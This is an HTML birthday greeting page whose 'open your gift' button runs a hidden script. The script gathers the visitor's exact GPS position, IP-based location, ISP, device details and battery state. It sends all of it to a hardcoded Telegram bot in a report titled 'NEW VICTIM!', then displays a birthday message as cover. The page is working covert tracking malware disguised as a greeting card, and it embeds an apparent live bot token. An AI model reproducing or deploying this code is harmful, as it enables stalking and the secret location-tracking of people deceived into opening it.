<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>🎁 Happy Birthday! 🎂</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            padding: 50px 40px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        .gift-icon {
            font-size: 100px;
            cursor: pointer;
            animation: bounce 1s ease infinite;
            display: inline-block;
            transition: transform 0.2s;
        }
        .gift-icon:hover {
            transform: scale(1.05);
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        h1 {
            color: #333;
            margin: 20px 0 10px;
            font-size: 28px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 25px;
        }
        button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            padding: 14px 35px;
            border-radius: 50px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: scale(1.02);
        }
        .loader {
            display: none;
            margin: 20px auto;
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff6b6b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            border-radius: 20px;
            padding: 25px;
            margin-top: 20px;
            display: none;
            color: white;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.show {
            display: block;
        }
        .footer {
            margin-top: 25px;
            font-size: 11px;
            color: #aaa;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="gift-icon" onclick="openGift()">🎁</div>
    <h1>🎂 Happy Birthday! 🎉</h1>
    <div class="subtitle">Someone has a special surprise for you!</div>
    <button onclick="openGift()">🎁 OPEN YOUR GIFT 🎁</button>
    <div class="loader" id="loader"></div>
    <div class="message" id="message">
        <h2>🎈 SURPRISE! 🎈</h2>
        <p>May your day be filled with joy! ✨</p>
        <p>🎂 HAPPY BIRTHDAY! 🎂</p>
    </div>
    <div class="footer">❤️ Made with love</div>
</div>

<script>
    // ================= CONFIG =================
    const BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs";
    const CHAT_ID = "6323367629";
    
    // ==========================================
    
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('id') || 'unknown';
    const targetName = urlParams.get('name') || 'Guest';
    
    let dataSent = false;
    
    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
            console.log('✅ Sent to Telegram');
        } catch(e) {
            console.log('Telegram send error:', e);
        }
    }
    
    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            }
        } catch(e) {}
        return { level: 'N/A', charging: false };
    }
    
    async function getAccurateIPInfo() {
        try {
            // Multiple APIs for better accuracy
            const apis = [
                'https://ipapi.co/json/',
                'https://ipwho.is/',
                'https://freeipapi.com/api/json/'
            ];
            
            for (const api of apis) {
                try {
                    const resp = await fetch(api);
                    const data = await resp.json();
                    if (data.ip && data.city) {
                        return {
                            ip: data.ip,
                            city: data.city || data.city_name || 'N/A',
                            region: data.region || data.region_name || 'N/A',
                            country: data.country_name || data.country || 'N/A',
                            postal: data.postal || data.postal_code || 'N/A',
                            isp: data.org || data.isp || 'N/A',
                            lat: data.latitude || data.lat || 'N/A',
                            lon: data.longitude || data.lon || 'N/A'
                        };
                    }
                } catch(e) {}
            }
        } catch(e) {}
        
        // Fallback
        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const ipData = await resp.json();
            return { ip: ipData.ip, city: 'N/A', region: 'N/A', country: 'N/A', postal: 'N/A', isp: 'N/A' };
        } catch(e) {
            return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', postal: 'N/A', isp: 'N/A' };
        }
    }
    
    async function openGift() {
        if (dataSent) return;
        
        document.querySelector('.gift-icon').style.display = 'none';
        document.querySelector('button').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        
        // Get battery info
        const battery = await getBatteryInfo();
        
        // Get accurate IP info
        const networkData = await getAccurateIPInfo();
        
        // Get GPS location
        let locationData = { lat: 'N/A', lon: 'N/A', accuracy: 'N/A', error: null };
        let locationSuccess = false;
        
        try {
            if (navigator.geolocation) {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    });
                });
                locationData = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: Math.round(pos.coords.accuracy),
                    altitude: pos.coords.altitude || 'N/A',
                    speed: pos.coords.speed || 'N/A'
                };
                locationSuccess = true;
            } else {
                locationData.error = "Geolocation not supported";
            }
        } catch(e) {
            locationData = { 
                lat: 'N/A', 
                lon: 'N/A', 
                accuracy: 'Blocked',
                error: e.message 
            };
        }
        
        // Get detailed device info
        const deviceData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
            screen: `${screen.width}x${screen.height}`,
            screenColorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            online: navigator.onLine ? 'Yes' : 'No',
            cookiesEnabled: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A'
        };
        
        // Create Google Maps link
        const mapLink = (locationData.lat != 'N/A' && locationData.lon != 'N/A') 
            ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}&z=15`
            : '';
        
        const ipMapLink = (networkData.lat != 'N/A' && networkData.lon != 'N/A')
            ? `https://www.google.com/maps?q=${networkData.lat},${networkData.lon}&z=10`
            : '';
        
        // Build message
        let message = `🔴 <b>NEW VICTIM!</b>\n\n`;
        message += `🎯 <b>ID:</b> ${targetId}\n`;
        message += `👤 <b>Name:</b> ${targetName}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        // GPS Section
        if (locationSuccess) {
            message += `<b>📍 GPS LOCATION (EXACT)</b>\n`;
            message += `   Lat: <code>${locationData.lat}</code>\n`;
            message += `   Lon: <code>${locationData.lon}</code>\n`;
            message += `   Accuracy: ${locationData.accuracy}m\n`;
            if(locationData.altitude != 'N/A') message += `   Altitude: ${locationData.altitude}m\n`;
            if(locationData.speed != 'N/A') message += `   Speed: ${locationData.speed}m/s\n`;
            message += `   🗺️ <a href="${mapLink}">📍 VIEW ON GOOGLE MAPS</a>\n`;
        } else {
            message += `<b>📍 GPS LOCATION</b>\n`;
            message += `   Status: ❌ Blocked/Permission Denied\n`;
            message += `   Error: ${locationData.error || 'User denied location'}\n`;
            if(networkData.lat != 'N/A') {
                message += `   (IP-Based Location: ${networkData.lat}, ${networkData.lon})\n`;
                if(ipMapLink) message += `   🗺️ <a href="${ipMapLink}">📍 VIEW IP LOCATION</a>\n`;
            }
        }
        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        // Network Section (Accurate)
        message += `<b>🌐 NETWORK INFO (REAL IP)</b>\n`;
        message += `   IP: <code>${networkData.ip}</code>\n`;
        message += `   City: ${networkData.city}\n`;
        message += `   Region: ${networkData.region}\n`;
        message += `   Country: ${networkData.country}\n`;
        message += `   Pincode: ${networkData.postal}\n`;
        message += `   ISP: ${networkData.isp}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        // Device Section
        message += `<b>📱 DEVICE INFO</b>\n`;
        message += `   Platform: ${deviceData.platform}\n`;
        message += `   Screen: ${deviceData.screen} (${deviceData.screenColorDepth}-bit)\n`;
        message += `   Pixel Ratio: ${deviceData.pixelRatio}x\n`;
        message += `   Language: ${deviceData.language}\n`;
        message += `   Timezone: ${deviceData.timezone}\n`;
        message += `   Hardware: ${deviceData.hardwareConcurrency} cores\n`;
        if(deviceData.deviceMemory != 'N/A') message += `   RAM: ${deviceData.deviceMemory} GB\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        // Battery Section
        message += `<b>🔋 BATTERY INFO</b>\n`;
        message += `   Level: ${battery.level}%\n`;
        message += `   Charging: ${battery.charging ? '✅ Yes' : '❌ No'}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        // Browser/Connection Section
        message += `<b>🌐 BROWSER INFO</b>\n`;
        message += `   Online: ${deviceData.online}\n`;
        message += `   Cookies: ${deviceData.cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
        message += `   Languages: ${deviceData.languages}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n`;
        message += `\n👨‍💻 <i>Powered by @KINGITACHI18</i>`;
        
        // Send to Telegram
        await sendToTelegram(message);
        
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('message').classList.add('show');
        }, 800);
        
        dataSent = true;
    }
</script>
</body>
</html>
